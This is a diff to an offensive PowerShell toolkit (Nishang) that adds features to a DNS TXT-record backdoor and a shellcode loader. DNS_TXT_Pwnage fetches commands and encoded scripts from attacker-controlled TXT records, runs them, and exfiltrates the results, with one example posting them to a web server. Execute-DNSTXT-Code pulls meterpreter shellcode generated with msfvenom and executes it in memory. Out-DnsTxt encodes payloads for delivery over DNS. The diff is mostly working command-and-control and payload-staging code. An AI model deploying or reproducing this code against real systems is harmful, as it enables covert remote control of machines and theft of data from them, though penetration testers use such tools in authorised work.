@@ -516,7 +516,7 @@ Name of Key to Extract. if the parameter is not used, all secrets will be displa
 PS > Get-LsaSecret
 
 .EXAMPLE
-PS > Get-LsaSecret -Key KeyName
+PS > Get-LsaSecret -RegistryKey KeyName
 Read contents of the key mentioned as parameter.
 
 .LINK
@@ -1123,13 +1123,17 @@ function DNS_TXT_Pwnage
 
 <#
 .SYNOPSIS
-Payload which acts as a backdoor and is capable of recieving commands and PowerShell scripts from DNS TXT queries.
+A backdoor capable of recieving commands and PowerShell scripts from DNS TXT queries.
 
 .DESCRIPTION
-This payload continuously queries a subdomain's TXT records. It could be sent commands and powershell scripts to be 
-executed on the target machine by TXT messages of a domain. The powershell scripts which would be served as TXT record
-MUST be encoded using Invoke-Encode. 
-If using DNS or Webserver ExfilOption, use Invoke-Decode.
+This script continuously queries a domain's TXT records. It could be sent commands and powershell scripts using the TXT records which are executed on the target machine.
+The PowerShell script which would be served as TXT record must be generated using Out-DnsTxt.ps1 in the Utility folder.
+
+While using the AuthNS option it should be kept in mind that it increases chances of detection.
+Leaving the DNS resolution to authorised name server of a target environment may be more desirable.
+
+If using DNS or Webserver ExfilOption, use Invoke-Decode.ps1 in the Utility folder to decode the exfiltrated data.
+
 .PARAMETER startdomain
 The domain (or subdomain) whose TXT records would be checked regularly for further instructions.
 
@@ -1143,40 +1147,45 @@ The domain (or subdomain) whose TXT records would be used to issue commands to t
  The string, if responded by TXT record of startdomain, will make the payload  query "psdomain" for encoded powershell script. 
 
 .PARAMETER psdomain
-The domain (or subdomain) which would be used to provide powershell scripts from its TXT records. 
+The domain (or subdomain) whose subdomains would be used to provide powershell scripts from TXT records.
+
+.PARAMETER subdomains
+The number of subdomains which would be used to provide powershell scripts from their TXT records.
+The length of DNS TXT records is assumed to be 255 characters, so more than one subdomains would be required.
 
 .PARAMETER stopstring
 The string, if responded by TXT record of startdomain, will stop this payload on the target.
 
-.PARAMETER AUTHNS
-Authoritative Name Server for the domains (or startdomain in case you are using separate domains). Startdomain 
-would be changed for commands and an authoritative reply shoudl reflect changes immediately.
+.PARAMETER AuthNS
+Authoritative Name Server for the domains (or for startdomain in case you are using separate domains). 
+Startdomain would be changed for commands and an authoritative reply shoudl reflect changes immediately.
 
 .PARAMETER NoLoadFunction
-This parameter is used for specifying that the script used in txt records $psdomain does NOT contain a function.
+This parameter is used for specifying that the script used in txt records $psdomain does NOT load a function.
 If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
-This would be the case if you are using Nishang scripts with this backdoor.
+This need not be specified if you are using Nishang scripts with this backdoor.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
 In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
 must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
 you want to execute. The TXT record could be changed live and the payload will pick up updated 
 record to execute new command.
 
 To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
-psdomain looking for a base64encoded powershell script. Use the StringToBase64 function to encode scripts to base64.
+1.script.alteredsecurity.com, 2.script.alteredsecurity.com and 3.script.alteredsecurity.com looking for a base64encoded powershell script. 
+Use the Out-DnsTxt script in the Utility folder to encode scripts to base64.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage start.alteredsecurity.com begincommands command.alteredsecurity.com startscript enscript.alteredsecurity.com stop ns8.zoneedit.com | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
-Use above command for using sending POST request to your webserver which is able to log the requests.
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+Use above command for sending POST request to your webserver which is able to log the requests.
 
 .LINK
-http://labofapenetrationtester.com/
+http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
 https://github.com/samratashok/nishang
 #>
 
@@ -1204,12 +1213,17 @@ https://github.com/samratashok/nishang
         $psdomain,
 
         [Parameter(Position = 5, Mandatory = $True)]
+        [String]
+        $Subdomains,
+
+        [Parameter(Position = 6, Mandatory = $True)]
 
         [String]
         $StopString,
 
-        [Parameter(Position = 6, Mandatory = $True)]
+        [Parameter(Position = 7, Mandatory = $True)]
         [String]$AuthNS,
+
 
         [Parameter()]
         [Switch]
@@ -1221,18 +1235,31 @@ https://github.com/samratashok/nishang
     {
         $exec = 0
         start-sleep -seconds 5
-        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
+        $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
+        if ($AuthNS -ne $null)
+        {
+            $getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain $AuthNS") 
+        }
         $tmp = $getcode | select-string -pattern "`""
         $startcode = $tmp -split("`"")[0]
         if ($startcode[1] -eq $cmdstring)
         {
             start-sleep -seconds 5
-            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
+            $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
+            if ($AuthNS -ne $null)
+            {
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain $AuthNS") 
+            } 
             $temp = $getcommand | select-string -pattern "`""
             $command = $temp -split("`"")[0]
             $pastevalue = Invoke-Expression $command[1]
             $pastevalue
             $exec++
+            if ($exfil -eq $True)
+            {
+                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
+                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
+            }
             if ($exec -eq 1)
             {
                 Start-Sleep -Seconds 60
@@ -1242,20 +1269,26 @@ https://github.com/samratashok/nishang
         if ($startcode[1] -match $psstring)
         {
                       
-            $getcommand = (Invoke-Expression "nslookup -querytype=txt $psdomain $AuthNS") 
-            $temp = $getcommand | select-string -pattern "`""
-            $tmp1 = ""
-            foreach ($txt in $temp)
+            $i = 1
+            while ($i -le $subdomains)
             {
-                $tmp1 = $tmp1 + $txt
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain") 
+                if ($AuthNS -ne $null)
+                {
+                    $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$psdomain $AuthNS") 
+                }
+                $temp = $getcommand | select-string -pattern "`""
+                $tmp1 = ""
+                $tmp1 = $tmp1 + $temp
+                $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
+                $i++
             }
-            $encdata = $tmp1 -replace '\s+', "" -replace "`"", ""
             #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
             $dec = [System.Convert]::FromBase64String($encdata)
             $ms = New-Object System.IO.MemoryStream
             $ms.Write($dec, 0, $dec.Length)
             $ms.Seek(0,0) | Out-Null
-            $cs = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)
+            $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
             $sr = New-Object System.IO.StreamReader($cs)
             $command = $sr.readtoend()
             # Check for the function loaded by the script.
@@ -1269,8 +1302,13 @@ https://github.com/samratashok/nishang
             {
                 $pastevalue = Invoke-Expression $command
             }
-            $pastevalue    
+            $pastevalue            
             $exec++
+            if ($exfil -eq $True)
+            {
+                $pastename = $env:COMPUTERNAME + " Results of DNS TXT Pwnage: "
+                Do-Exfiltration "$pastename" "$pastevalue" "$ExfilOption" "$dev_key" "$username" "$password" "$URL" "$DomainName" "$ExfilNS"
+            }
             if ($exec -eq 1)
             {
                 Start-Sleep -Seconds 60
@@ -1296,20 +1334,24 @@ function Execute-DNSTXT-Code
 Payload which could execute shellcode from DNS TXT queries.
 
 .DESCRIPTION
-This payload is able to pull shellcode from txt record of a domain. It has been tested for 
-first stage of meterpreter shellcode generated using msf.
-Below commands could be used to generate shellcode to be usable with this payload
-./msfpayload windows/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'
-./msfpayload windows/x64/meterpreter/reverse_tcp LHOST= EXITFUNC=process C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- |sed 's/^[^0]*\(0.*\/\*\).*/\1/' | sed 's/.\{2\}$//' | tr -d '\n'
+This payload is able to pull shellcode from txt record of a domain. 
+Below commands could be used to generate shellcode to be usable with this script
+./msfvenom -p windows/meterpreter/reverse_https -f powershell LHOST=<>
+./msfvenom -p windows/x64/meterpreter/reverse_https -f powershell LHOST=<>
+
+To generate TXT records from above shellcode, use Out-DnsTxt.ps1 in the Utility folder.
 
 .PARAMETER shellcode32
-The domain (or subdomain) whose TXT records would hold 32-bit shellcode.
+The domain (or subdomain) whose subbdomain's TXT records would hold 32-bit shellcode.
 
 .PARAMETER shellcode64
-The domain (or subdomain) whose TXT records would hold 64-bit shellcode.
+The domain (or subdomain) whose subbdomain's TXT records would hold 64-bit shellcode.
 
  .PARAMETER AUTHNS
 Authoritative Name Server for the domains.
+
+.PARAMETER subdomains
+The number of subdomains which would be used to provide shellcode from their TXT records.
 
 
 .EXAMPLE
@@ -1317,11 +1359,11 @@ PS > Execute-DNSTXT-Code
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com
+PS > Execute-DNSTXT-Code 32.alteredsecurity.com 64.alteredsecurity.com ns8.zoneedit.com -SubDomains 5
 Use above from non-interactive shell.
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
+http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
 https://github.com/samratashok/nishang
 
 .NOTES
@@ -1341,21 +1383,61 @@ http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
 
         [Parameter(Position = 2, Mandatory = $True)]
         [String]
-        $AuthNS
-    )
+        $AuthNS,
 
-    $code = (Invoke-Expression "nslookup -querytype=txt $shellcode32 $AuthNS")  
-    $tmp = $code | select-string -pattern "`"" 
-    $tmp1 = $tmp -split("`"")[0] 
-    [string]$shell = $tmp1 -replace "`t", "" 
-    $shell = $shell.replace(" ", "") 
-    [Byte[]]$sc32 = $shell -split ',' 
-    $code64 = (Invoke-Expression "nslookup -querytype=txt $shellcode64 $AuthNS")  
-    $tmp64 = $code64 | select-string -pattern "`"" 
-    $tmp164 = $tmp64 -split("`"")[0] 
-    [string]$shell64 = $tmp164 -replace "`t", "" 
-    $shell64 = $shell64.replace(" ", "") 
-    [Byte[]]$sc64 = $shell64 -split ',' 
+        [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $Subdomains
+
+    )
+    
+    #Function to get shellcode from TXT records
+    function Get-ShellCode
+    {
+        Param(
+            [Parameter()]
+            [String]
+            $ShellCode
+        )
+        $i = 1
+        while ($i -le $subdomains)
+        {
+            $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode") 
+            if ($AuthNS -ne $null)
+            {
+                $getcommand = (Invoke-Expression "nslookup -querytype=txt $i.$ShellCode $AuthNS") 
+            }
+            $temp = $getcommand | select-string -pattern "`""
+            $tmp1 = ""
+            $tmp1 = $tmp1 + $temp
+            $encdata = $encdata + $tmp1 -replace '\s+', "" -replace "`"", ""
+            $i++
+        }
+        #Decode the downloaded powershell script. The decoding logic is of Invoke-Decode in Utility directory.
+        $dec = [System.Convert]::FromBase64String($encdata)
+        $ms = New-Object System.IO.MemoryStream
+        $ms.Write($dec, 0, $dec.Length)
+        $ms.Seek(0,0) | Out-Null
+        $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
+        $sr = New-Object System.IO.StreamReader($cs)
+        $sc = $sr.readtoend()
+        return $sc
+    }
+    if ([IntPtr]::Size -eq 8) 
+    {
+        $Shell64 = (Get-ShellCode $ShellCode64)
+        #Remove unrequired things from msf shellcode
+        $tmp = $Shell64 -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
+        [Byte[]]$sc = $tmp -split ','
+    } 
+    else
+    {
+        $shell32 = (Get-ShellCode $ShellCode32)
+        $tmp = $Shell32 -replace "`n","" -replace '\$buf \+\= ',"," -replace '\[Byte\[\]\] \$buf \=' -replace " "
+        [Byte[]]$sc = $tmp -split ','
+    }
+
+    #Code Execution logic
     $code = @' 
     [DllImport("kernel32.dll")] 
     public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); 
@@ -1365,18 +1447,17 @@ http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
     public static extern IntPtr memset(IntPtr dest, uint src, uint count); 
 '@ 
     $winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru 
-    [Byte[]]$sc = $sc32 
-    if ([IntPtr]::Size -eq 8) {$sc = $sc64} 
     $size = 0x1000 
     if ($sc.Length -gt 0x1000) {$size = $sc.Length} 
     $x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40) 
     for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)} 
     $winFunc::CreateThread(0,0,$x,0,0,0) 
-    while(1)
+    while($True)
     {
         start-sleep -Seconds 100
     }
 }
+
 
 ###############################################convert an executable to text file.#######################################################
 function ExetoText
@@ -5377,4 +5458,119 @@ https://github.com/samratashok/nishang
         }
         Start-Sleep -Seconds 5
     }
+}
+
+###################################Function for generating encoded DNS TXT Records###########################
+function Out-DnsTxt
+{
+<#
+.SYNOPSIS
+Script for Nishang to generate DNS TXT records which could be used with other scripts. 
+
+.DESCRIPTION
+Use this script to generate DNS TXT records to be used with DNS_TXT_Pwnage and Execute-DNSTXT-Code.
+The script asks for a path to a plain file or string, compresses and encodes it and writes to a file "encodedtxt.txt" in the current working directory.
+Each line in the generated file is a DNS TXT record to be saved in separate subbdomain.
+The length of DNS TXT records is assumed to be 255 characters by the script.
+
+.PARAMETER DataToEncode
+The path of the file to be decoded. Use with -IsString to enter a string.
+
+.PARAMETER OutputFilePath
+The path of the output file. Default is "encodedtxt.txt" in the current working directory.
+
+.PARAMETER $LengthOfTXT
+The length of the TXT records. Default is 255.
+
+.PARAMETER IsString
+Use this to specify the command to be encoded if you are passing a string in place of a filepath.
+
+.EXAMPLE
+PS > OUT-DNSTXT -DataToEncode C:\nishang\Gather\Get-Information.ps1
+Use above command to generate encoded DNS TXT records. Each record must be put in a separate subdomain.
+
+.EXAMPLE
+PS > OUT-DNSTXT "Get-Service" -IsString
+Use above to generate TXT records for a command.
+
+
+.EXAMPLE
+PS > OUT-DNSTXT -DataToEncode C:\shellcode\shellcode.txt
+Use above command to generate encoded DNS TXT records for a shellcode. Each record must be put in a separate subdomain.
+
+.LINK
+http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html
+https://github.com/samratashok/nishang
+
+#>
+    [CmdletBinding()] Param(
+        [Parameter(Position = 0, Mandatory = $True)]
+        [String]
+        $DataToEncode,
+
+        [Parameter(Position = 1, Mandatory = $False)]
+        [String]
+        $OutputFilePath = "$pwd\encodedtxt.txt", 
+
+        [Parameter(Mandatory = $False)]
+        [String]
+        $LengthOfTXT = 255, 
+
+        [Switch]
+        $IsString
+    )
+    if($IsString -eq $true)
+    {
+    
+       $Enc = $DataToEncode
+       
+    }
+    else
+    {
+        $Enc = Get-Content $DataToEncode -Encoding Ascii
+    }
+    
+    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+    $ms = New-Object IO.MemoryStream
+    $action = [IO.Compression.CompressionMode]::Compress
+    $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+    $Enc | ForEach-Object {$sw.WriteLine($_)}
+    $sw.Close()
+    # Base64 encode stream
+    $Compressed = [Convert]::ToBase64String($ms.ToArray())
+    $index = [math]::floor($Compressed.Length/$LengthOfTXT)
+    $i = 0
+    Out-File -InputObject $null -FilePath $OutputFilePath
+    #Split encoded input in strings of 255 characters if its length is more than 255.
+    if ($Compressed.Length -gt $LengthOfTXT)
+    {
+        while ($i -lt $index )
+        {
+            $TXTRecord = $Compressed.Substring($i*$LengthOfTXT,$LengthOfTXT)
+            $i +=1
+            Out-File -InputObject $TXTRecord -FilePath $OutputFilePath -Append
+            Out-File -InputObject "`n`n`n" -FilePath $OutputFilePath -Append
+        }
+        $remainingindex = $Compressed.Length%$LengthOfTXT
+        if ($remainingindex -ne 0)
+        {
+            $TXTRecord = $Compressed.Substring($index*$LengthOfTXT, $remainingindex)
+            $TotalRecords = $index + 1
+        }
+        #Write to file
+        Out-File -InputObject $TXTRecord -FilePath $OutputFilePath -Append
+        Write-Output "You need to create $TotalRecords TXT records."
+        Write-Output "All TXT Records written to $OutputFilePath"
+    }
+    #If the input has small length, it could be used in a single subdomain.
+    else
+    {
+        Write-Output "TXT Record could fit in single subdomain."
+        Write-Output $Compressed
+        Out-File -InputObject $Compressed -FilePath $OutputFilePath -Append
+        Write-Output "TXT Records written to $OutputFilePath"
+    }
+
+
 }
